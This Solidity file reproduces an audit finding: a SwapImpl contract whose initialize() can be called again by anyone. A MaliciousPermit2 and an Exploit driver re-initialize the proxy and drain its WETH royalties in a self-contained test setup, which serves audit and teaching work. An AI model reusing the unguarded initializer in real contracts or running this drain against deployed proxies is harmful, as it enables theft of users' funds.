// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic reproduction of finding 63937 (C-01):
// "Anyone can re-initialize the `swapProxy`".
//
// Source (Pashov Audit Group), SwapImpl contract. `initialize()` is reproduced
// VERBATIM (marked @> on the declaration — no access control, no once-guard).
//
// Root cause: `SwapImpl::initialize` has no access control and no
// already-initialized guard, so it can be called again after deployment. An
// attacker re-initializes the proxy with a malicious `permit2`; the function then
// `WETH.safeApprove(_permit2, type(uint256).max)`, handing the attacker's
// contract an unlimited allowance over the proxy's WETH. The attacker drains all
// WETH (royalties) sitting in the proxy.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function approve(address s, uint256 a) external returns (bool);
    function transferFrom(address f, address t, uint256 a) external returns (bool);
}

library SafeERC20 {
    function safeApprove(IERC20 t, address s, uint256 a) internal { require(t.approve(s, a), "approve failed"); }
}

interface IPermit2 { function approve(address token, address spender, uint160 amount, uint48 expiration) external; }

/// @dev Faithful minimal WETH (the royalty asset held by the proxy).
contract WETH9 is IERC20 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        require(al >= a, "insufficient allowance");
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        balanceOf[f] -= a; balanceOf[t] += a; return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `initialize()` is reproduced VERBATIM (unprotected).
// ─────────────────────────────────────────────────────────────────────────────
contract SwapImpl {
    using SafeERC20 for IERC20;

    struct Layout {
        address router;
        address permit2;
        IERC20 WETH;
        uint24 FEE_TIER;
        uint16 SLIPPAGE_BPS;
    }
    Layout internal $;

    function initialize( // @> VULN: no access control and no already-initialized guard — anyone can call this again after deployment
        address _universalRouter,
        address _permit2,
        address _weth,
        uint24 _feeTier,
        uint16 _slippageBps
    ) external {
        $.router = _universalRouter;
        $.permit2 = _permit2;
        $.WETH = IERC20(_weth);
        $.FEE_TIER = _feeTier;
        $.SLIPPAGE_BPS = _slippageBps;

        $.WETH.safeApprove(_permit2, type(uint256).max); // hands `_permit2` unlimited allowance over the proxy's WETH
        IPermit2(_permit2).approve(address($.WETH), _universalRouter, type(uint160).max, type(uint48).max);
    }

    function router() external view returns (address) { return $.router; }
    function permit2() external view returns (address) { return $.permit2; }
}

/// @dev Attacker's malicious permit2: no-op approve, plus a drain that spends the
///      allowance `initialize` granted it over the proxy's WETH.
contract MaliciousPermit2 is IPermit2 {
    function approve(address, address, uint160, uint48) external {}
    function drain(IERC20 weth, address from, address to) external {
        weth.transferFrom(from, to, weth.balanceOf(from));
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: proxy holds 100 WETH of royalties; attacker re-initializes it
// with a malicious permit2 and drains the WETH.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    uint256 internal constant ROYALTIES = 100e18;

    WETH9 public weth;               // child nonce 1 (drained asset)
    SwapImpl public vuln;            // child nonce 2 (VULN)
    MaliciousPermit2 public evil;    // child nonce 3
    MaliciousPermit2 public benign;  // child nonce 4 (honest permit2 for the legit init)

    uint256 public drained;

    constructor() {
        weth = new WETH9();               // nonce 1
        vuln = new SwapImpl();            // nonce 2
        evil = new MaliciousPermit2();    // nonce 3
        benign = new MaliciousPermit2();  // nonce 4
    }

    function run() external {
        // legit deployment-time init with honest router/permit2
        vuln.initialize(address(0xA11CE), address(benign), address(weth), 3000, 50);
        // royalties accumulate in the proxy
        weth.mint(address(vuln), ROYALTIES);

        uint256 before = weth.balanceOf(address(this));

        // attacker RE-initializes with a malicious permit2 -> proxy approves it for all WETH
        vuln.initialize(address(this), address(evil), address(weth), 3000, 50);
        require(vuln.permit2() == address(evil), "reinit failed");

        // malicious permit2 spends the freshly-granted allowance and drains the proxy
        evil.drain(IERC20(address(weth)), address(vuln), address(this));
        drained = weth.balanceOf(address(this)) - before;

        // harm: the proxy's entire WETH balance is stolen
        require(drained == ROYALTIES, "did not drain proxy WETH");
        require(weth.balanceOf(address(vuln)) == 0, "proxy not emptied");
    }
}
